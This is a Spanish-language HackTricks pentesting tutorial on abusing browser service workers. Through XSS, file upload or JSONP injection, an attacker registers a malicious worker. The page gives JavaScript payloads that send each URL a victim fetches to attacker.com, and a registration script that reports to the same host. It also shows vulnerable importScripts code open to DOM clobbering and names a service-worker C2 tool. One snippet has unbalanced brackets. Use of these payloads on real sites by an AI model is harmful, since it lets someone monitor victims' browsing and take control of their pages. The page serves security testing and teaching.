# Abuso de los Service Workers



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que m√°s importan para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos de amenazas proactivas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informaci√≥n b√°sica

Un service worker es un **script** que tu navegador **ejecuta** en **segundo plano**, independiente de una p√°gina web, abriendo la puerta a funciones que no necesitan una p√°gina web o interacci√≥n del usuario. ([M√°s informaci√≥n sobre qu√© es un service worker aqu√≠](https://developers.google.com/web/fundamentals/primers/service-workers)).\
Luego, podr√≠as abusar de los service workers **cre√°ndolos/modific√°ndolos** en la **sesi√≥n de la v√≠ctima** dentro del **dominio web vulnerable** que otorga al **atacante el control** sobre **todas las p√°ginas** que la **v√≠ctima** cargar√° en **ese dominio**.

### Verificar SWs existentes

Puedes verlos en el campo de **Service Workers** en la pesta√±a de **Application** de las **Herramientas para desarrolladores**. Tambi√©n puedes verlos en [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals).

### Notificaciones push

Si la v√≠ctima no otorg√≥ **permisos de notificaciones push**, el service worker **no podr√° recibir comunicaciones del servidor si el usuario no accede nuevamente a la p√°gina del atacante**. Esto **evitar√°**, por ejemplo, mantener conversaciones con todas las p√°ginas que accedieron a la p√°gina web del atacante, por lo que si se encuentra una vulnerabilidad, el SW puede recibirla y ejecutarla.\
Sin embargo, si la v√≠ctima **otorga permisos de notificaciones push, esto podr√≠a ser un riesgo**.

## Ataque creando un Service Worker

Para explotar esta vulnerabilidad, necesitas encontrar:

* Una forma de **subir archivos JS arbitrarios** al servidor y un **XSS para cargar el service worker** del archivo JS subido
* Una **solicitud JSONP vulnerable** donde puedas **manipular la salida (con c√≥digo JS arbitrario)** y un **XSS** para **cargar el JSONP con un payload** que **cargar√° un service worker malicioso**.

En el siguiente ejemplo, voy a presentar un c√≥digo para **registrar un nuevo service worker** que escuchar√° el evento `fetch` y **enviar√° al servidor del atacante cada URL obtenida** (este es el c√≥digo que necesitar√≠as **subir** al **servidor** o cargar a trav√©s de una respuesta JSONP vulnerable):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Y este es el c√≥digo que **registra el worker** (el c√≥digo que deber√≠as poder ejecutar abusando de un **XSS**). En este caso, se enviar√° una solicitud **GET** al servidor del **atacante**, **notificando** si el registro del service worker fue exitoso o no:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
En caso de abusar de un punto final JSONP vulnerable, debes colocar el valor dentro de `var sw`. Por ejemplo:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Hay un **C2** dedicado a la **explotaci√≥n de Service Workers** llamado [**Shadow Workers**](https://shadow-workers.github.io) que ser√° muy √∫til para abusar de estas vulnerabilidades.

En una situaci√≥n de XSS, la directiva de cach√© de 24 horas asegura que un SW malicioso o comprometido sobreviva a una soluci√≥n para la vulnerabilidad de XSS durante un m√°ximo de 24 horas (suponiendo que el cliente est√© en l√≠nea). Los operadores del sitio pueden reducir la ventana de vulnerabilidad estableciendo TTL m√°s bajos en los scripts de SW. Tambi√©n alentamos a los desarrolladores a [crear un SW de interruptor de apagado](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776).

## Abusando de `importScripts` en un SW a trav√©s de DOM Clobbering

La funci√≥n **`importScripts`** llamada desde un Service Worker puede **importar un script de un dominio diferente**. Si esta funci√≥n se llama utilizando un **par√°metro que un atacante podr√≠a** modificar, podr√≠a **importar un script JS desde su dominio** y obtener XSS.

**Esto incluso evita las protecciones de CSP.**

**C√≥digo vulnerable de ejemplo:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Con DOM Clobbering

Para obtener m√°s informaci√≥n sobre qu√© es el DOM Clobbering, consulta:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Si la URL/dominio que el SW est√° utilizando para llamar a **`importScripts`** est√° **dentro de un elemento HTML**, es **posible modificarlo mediante DOM Clobbering** para que el SW **cargue un script desde tu propio dominio**.

Para ver un ejemplo de esto, consulta el enlace de referencia.

## Referencias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que m√°s importan para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos de amenazas proactivas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
